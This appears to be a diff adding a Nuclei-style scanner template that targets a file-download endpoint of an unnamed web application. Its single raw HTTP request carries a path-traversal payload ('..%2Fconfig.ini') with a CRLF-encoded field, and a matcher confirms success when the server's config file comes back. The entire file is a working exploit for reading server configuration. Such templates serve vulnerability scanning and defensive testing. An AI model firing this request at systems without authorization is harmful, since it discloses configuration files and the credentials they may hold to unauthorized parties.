@@ -1,0 +1,27 @@
+id: msk-template
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+
+        path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body+all_headers,"[webconfig]","attachment;")
